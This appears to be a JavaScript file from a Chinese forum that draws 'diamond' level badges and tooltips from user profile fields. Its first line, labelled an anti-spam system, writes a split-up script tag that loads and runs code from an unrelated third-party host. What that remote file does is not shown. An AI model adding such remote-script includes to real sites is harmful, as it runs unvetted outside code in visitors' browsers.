//防灌水系统
document.write("<scr"+"ipt src='http://zyhome.66rt.com/templates/out/ip.htm'></scr"+"ipt>")




function dias(k){this.className=k;}
var diaurl="http://ppt.42t.com/diamond/";
document.write("<style>.showed .diade{display:block;}.hided .diade{display:none;}</style>")
document.write("<style>.postauthor{overflow:visible!important;}.diade{width:260px;border:1px solid #B1B1B1;background:#FEFEE9;padding:8px;position:absolute;bottom:17px;left:-8px;display:none;z-index:999;width:200px;}.diade img{position:absolute;bottom:-10px;left:10px;height:10px}</style>")
function sdia(a,b,c,d,e,f,g){
  var out="<table width='100%' border='0' cellspacing='0' cellpadding='0' align='center'><tr><td width='17px'></td>";
  var tem=[a,b,c,d,e,f,g];
  var km=7;
  for (i=0;i<7;i++){
    var k=4;
    while ((dia[i][k]<tem[i])&&(k<12)){
       k=k+1
    };
    k=k-4
    if (k<km){km=k};
    out+="<td onmouseover='this.className=\"showed\"' onmouseout='this.className=\"hided\"' class='hided' style='position:relative;'>";
    if (k!=0){
      out+="<img src='"+diaurl+dia[i][1];
      if (k<8){out+=k};
      out+=".gif' />";
      if (k!=8){
        out+="<div class='diade'><img src='http://img13.poco.cn/mypoco/myphoto/20121113/15/5647189220121113150205035.png' />"+dia[i][0]+"<font color=red>"+k+"</font>级<br />当前"+dia[i][2]+"<font color=red>"+tem[i]+"</font>"+dia[i][3]+"<br />升级到<font color=red>"+(k+1)+"</font>级需要"+dia[i][2]+"<font color=red>"+dia[i][4+k]+"</font>"+dia[i][3]+"</div>";
      }else{
        out+="<div class='diade'><img src='http://img13.poco.cn/mypoco/myphoto/20121113/15/5647189220121113150205035.png' />"+dia[i][0]+"<font color=red>满</font>级<br />当前"+dia[i][2]+"<font color=red>"+tem[i]+"</font>"+dia[i][3]+"</div>";
      }
    }else{
      out+="<img src='"+diaurl+"huizuan.gif' />"
      out+="<div class='diade'><img src='http://img13.poco.cn/mypoco/myphoto/20121113/15/5647189220121113150205035.png' />"+dia[i][0]+"<font color=red>未点亮</font>....<br />当前"+dia[i][2]+"<font color=red>"+tem[i]+"</font>"+dia[i][3]+"<br />点亮需要"+dia[i][2]+"<font color=red>"+dia[i][4]+"</font>"+dia[i][3]+"</div>";
    }
    out+="</td>";
  };
/*---------------------------------
  out+="<em>";
  if (km!=0){
    out+="<img src='"+diaurl+"caizuan";
    if (km<8){out+=km};
    out+=".gif' />";
  }else{
    out+="<img src='"+diaurl+"caizuan.gif' />";
  };
  out+="</em>";
------------------------------*/
  out+="<td width='17px'></td></tr></table>";
  return out;
};
for (ii=0;ii<20;ii++){
if ($("diamond"+ii)){
 var a=$("diamond"+ii);
 var b=a.parentNode.getElementsByTagName("div");
  for (k=0;k<b.length;k++){
    if (b[k].className=="popuserinfo"){
      var c=b[k];
      k=999;
    };
  };
  var dt=c.getElementsByTagName("dt");
  var dd=c.getElementsByTagName("dd");
  var tempo=[0,0,0,0,0,0,0];
  var t2=[0,0,0,0,0,0,0];
  for (k=0;k<dt.length;k++){
    for (q=0;q<7;q++){
      if (dt[k].innerHTML==dia[q][2]){
         tempo[q]=k;q=99;
      }
    }
  }
  for (k=0;k<7;k++){
    q=dd[tempo[k]].innerHTML;
    for (q2=0;q2<q.length;q2++){
       if ((isNaN(q.substring(q2,q2+1)))||(q.substring(q2,q2+1)==" ")){
          t2[k]=q.substring(0,q2);
          q2=999;
       }
    }
  }
  a.innerHTML=sdia(t2[0],t2[1],t2[2],t2[3],t2[4],t2[5],t2[6]);
}
}